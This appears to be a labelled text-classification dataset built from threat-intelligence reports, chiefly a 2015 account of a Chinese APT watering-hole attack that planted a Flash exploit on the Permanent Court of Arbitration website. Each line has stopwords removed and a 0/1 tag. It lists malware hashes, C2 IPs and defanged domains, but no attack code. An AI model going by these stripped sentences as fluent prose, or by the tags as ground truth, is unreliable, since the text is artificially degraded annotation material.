e7d960060d602deb53c7d49d2002c4a4 ) 5340fcfb3d2fa263c280e9659d13ba93 Compilation Date 2014 - 04 - 23 01:23:41 C&C 196.1.99.15 ( SN ) wwap[.]publiclol[.]com Filename 報價單 Finarcs.xls Dropped Files ~tasyd3.xls ( c5118ba47b7aa12d6524f648f1623cc1 ) ka4a8213.log kb71271.log winlogdate.exe ( ba4f88fe44d02a299dbeab18c37f74f3 ) a6b4b679a51627ce279d5107c20dd078 Compilation Date 2014 - 04 - 29 03:44:19 C&C 59.0.249.11 ( KR ) Filename spoolv.exe Dropped Files N / A ( sample dropped backdoor ) d444be30d2773b23de38ead1f2c6d117 Compilation Date 2014 - 05 - 14 13:34:46 C&C 198.209.212.82 ( US ) Filename 1030522 新機關籌備小組清單 rcs DOC Archive 1030522 新機關籌備小組清單.7z ( 75193fc10145931ec0788d7c88fc8832 ) Dropped Files ~trfai3.doc ( 196ae8d6a5d19737ae6975d047ab1d59 ) ka4a8213.log kb71271.log sysupdate.exe ( 86ef188537f5e4637df24336c9b21cb0 ) b3830791b0a397bea2ad943d151f856b Compilation Date 2014 - 05 - 14 08:16:41 C&C 198.209.212.82 ( US ) Filename 招標規範 Finarcs.doc Archive 招標規範.rar ( 8629b95f9e0898793e0881a8f79ee0cf ) Dropped Files ~taste3.doc ( aeaf1e78c2082644b122bf32803acb1f ) ka4a8213.log kb71271.log spoolvs.exe ( 5eba8ced8656da865f91d5fc87e8dc74 ) [ 1 ] http://www.crowdstrike.com/blog/whois-numbered-panda/ [ 2 ] http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf [ 3 ] http://www.symantec.com/security_response/writeup.jsp?docid=2013-080921-5219-99&tabid=2 [ 4 ] https://blog.commtouch.com/cafe/malware/exe-read-backwards-spells-malware/ [ 5 ] http://threatpost.com/sirefef-malware-found-using-unicode-right-to-left-override-technique/102033 [ 6 ] http://blog.malwarebytes.org/online-security/2014/01/the-rtlo-method/ [ 7 ] http://www.fireeye.com / blog / technical/2013/08/survival - - - fittest - new - york - times - attackers - evolve- quickly.html [ 8 ] https://github.com/arbor/reversing/blob/master/find_byte_strings.py [ 9 ] http://www.arbornetworks.com/asert/2013/07/asert-mindshare-finding-byte-strings-using-idapython/ [ 10 ] https://www.symantec.com/security_response/writeup.jsp?docid=2014-011500-2419-99&tabid=2 [ 11 ] http://read.pudn.com/downloads199/sourcecode/windows/935255/htran.cpp__.htm The Arbor Security Engineering & Response Team ( ASERT ) Arbor Networks delivers world - class network security research analysis benefit today 's enterprise network operators	0
ASERT engineers researchers part elite group institutions referred " super remediators " represent best information security	0
This reflection visibility remediation capabilities majority service provider networks globally	0
ASERT shares operationally viable intelligence hundreds international Computer Emergency Response Teams ( CERTs ) thousands network operators via intelligence briefs security content feeds	0
ASERT also operates world largest distributed honeynet actively monitoring Internet threats around clock around globe via ATLAS Arbor 's global network sensors http://atlas.arbor.net	0
This mission associated resources Arbor Networks brings bear problem global Internet security impetus innovation research	0
To view latest research news trends Arbor ASERT information security community large visit Threat Portal http://www.arbornetworks.com / threats/.	0
In early July 2015 Chinese APT actors used Adobe Flash Player exploit within specific webpage detailing noteworthy international legal case Philippines China	0
This precedent setting legal case would followed many Southeast Asian nations well others around globe	0
The exploit appeared day three Permanent Court Arbitration tribunal exposing untold number interested parties visited webpage potential exploitation	0
When considered holistically intelligence supports conclusion exploitation campaign purposefully carried backdrop diplomatic legal maneuvering	0
Despite Beijing 's unwillingness participate international arbitration rejection PCA 's jurisdiction appears distinct effort surreptitiously target interested landmark international legal case via electronic means	0
ThreatConnect shared details incident Common Community within Incident 20150710D Permanent Court Arbitration Flash Exploit	0
Log ThreatConnect account register one via Community Editions access comprehensive widely adopted Threat Intelligence Platform market	0
Since revelation Adobe Flash Player zero day exploit exposed part leaked " Hacking Team " arsenal July 6th 2015 ( designated CVE-2015 - 5119 ) ThreatConnect Intelligence Research Team monitoring adoption malicious actors tied " Hacking Team "	0
On Thursday July 9 2015 ThreatConnect observed CVE-2015 - 5119 exploit embedded strategically within website Permanent Court Arbitration ( PCA ) 72 hours exploit disclosed publicly	0
The significance PCA " intergovernmental organization providing variety dispute resolution services international community " located " Peace Palace " within The Hague Netherlands	0
The 102-year - old Peace Palace historic fixture within sphere international law also houses International Court Justice principal judicial body United Nations well bodies resources uphold support international laws norms many nations adhere	0
The exploit posted PCA website first round arguments notable international legal case Philippines contesting Chinese territorial expansion within South China Sea ( SCS ) specifically challenging encroachment Philippines exclusive economic zone ( EEZ )	0
These arbitral proceedings initially instituted Republic Philippines People 's Republic China Annex VII United Nations Convention Law Sea ( UNCLOS ) January 22 2013	0
Two years later July 09 2015 attacker compromised official PCA webpages	0
This exploitation almost certainly random compromise PCA website ; rather occurred initial phase legal proceedings	0
The exploit embedded within pages specifically described legal case The Republic Philippines v.	0
The People 's Republic China	0
According URLQuery attackers placed CVE-2015 - 5119 Flash Exploit malicious URL [ http:]//pic.nicklockluckydog[.]org / movie.swf altered PCA webpages load URL visited	0
The domain pic.nicklockluckydog[.]org resolved IP address 192.243.116[.]241 ( Phoenix Arizona US ) time initial exploitation	0
IP Address 192.243.116[.]241 owned IT7 Networks Inc. provides self - managed Virtual Private Server ( VPS ) infrastructure	0
The attackers shifted domain later resolving IP Address 108.61.117[.]9 ( Haarlem Netherlands ) Friday July 10th day tribunal convened The Hague	0
The malware payload associated exploit identified MD5 B4522D05A9E3A034AF481A7797A445EA ( Rdws.exe )	0
This payload dropper executable deploys main malware component using dynamic link library ( DLL ) sideloading technique malicious DLL dropped alongside legitimate program executable load malicious DLL filename	0
In instance attackers leveraged legitimate Google Chrome Frame Helper executable MD5	0
DFDC5B09C4DEA79EB7F5B9E4E76EECF9 ( LMS.exe ) malicious sideload DLL file MD5 2EE25DE7BD6A2705F3F8DDE0DD681E96 ( dbghelp.dll )	0
LMS.exe load DLL file name dbghelp.dll found path hence sideloading technique	1
In turn The malicious DLL loads backdoor binary blob MD5 16E5A27BD55E0B4E595C9743F4C75611 ( ticrf.rat )	1
The malware connects back exploit domain pic.nicklockluckydog[.]org well subdomain ssl.nicklockluckydog[.]org	1
The domain ssl.nicklockluckydog[.]org resolved 175.45.233[.]205 ( Seoul South Korea ) time analysis	0
ThreatConnect also uncovered related malware sample MD5 5877D15215B7F398319F0DE7BA7B1947 submitted Malwr.com July 15 2015	0
This malware implant matches type used leverages C2 domains books.blueworldlink2015[.]net vpn.nicklockluckydog[.]org	0
The former domain resolves Netherlands IP 108.61.117[.]9 resolved pic.nicklockluckydog[.]org July 10th	0
blueworldlink2015[.]net registered email address nicklock2004[@]aol[.]com noticeably uses " nicklock " pseudonym found domain nicklockluckydog[.]org uses falsified address info " zhongguohunansheng " Beijing China	0
The domain nicklockluckydog[.]org registered July 9th 2015 06:22Z Chinese domain reseller using falsified information name Lanny Chen address 7946 N Bridle Creek Way Xiamen Taiwan	0
On interesting note registration address 7946 N Bridle Creek Way observed within civil suit National Football League various Chinese domain resellers originally filed May 2014	0
In early July 2015 Chinese APT actors would operationalize Adobe Flash Player exploit within 72 hours public disclosure strategically staging within specific webpage detailing noteworthy international legal case Philippines China	0
This precedent setting legal case would followed many Southeast Asian nations well around globe	0
The exploit appeared first round hearings exposing untold number interested parties visited webpage	0
The tactic leveraging strategic website compromises patched unpatched exploits well known observable used consistently various APT groups recent years	0
When considered holistically intelligence supports conclusion exploitation campaign purposefully carried backdrop diplomatic legal maneuvering	0
Manila long recognized unable independently lock horns China diplomatically militarily invoking dispute settlement procedures UNCLOS agreement China Philippines signatories	0
The Philippines seeking leverage international law level playing field China 's regional diplomatic military dominance ultimate goal deter aggressive Chinese expansion activities within Philippine EEZ broader South China Sea	0
Despite Beijing 's unwillingness participate international arbitration rejection PCA 's jurisdiction appears distinct effort surreptitiously monitor interested landmark international legal case via electronic means	0
This vignette also highlights critical difference threat data threat intelligence	0
The latter goes beyond simply pulling stream open source indicators blindly pushing enterprise network security devices SIEM tools hoping something hits ( works great ; 'll get TONS hits … misses depending perspective )	0
A true Threat Intelligence Platform enables tactical operational strategic analysis details behind technical within context non- technical socio - political	0
ThreatConnect previously shared Threat Intelligence research espionage activity tied increasing tensions within South China Sea	0
In similar fashion ThreatConnect shared additional details incident Common Community within Incident 20150710D Permanent Court Arbitration Flash Exploit	0
Log ThreatConnect account register one via Community Editions access comprehensive widely adopted Threat Intelligence Platform market	0
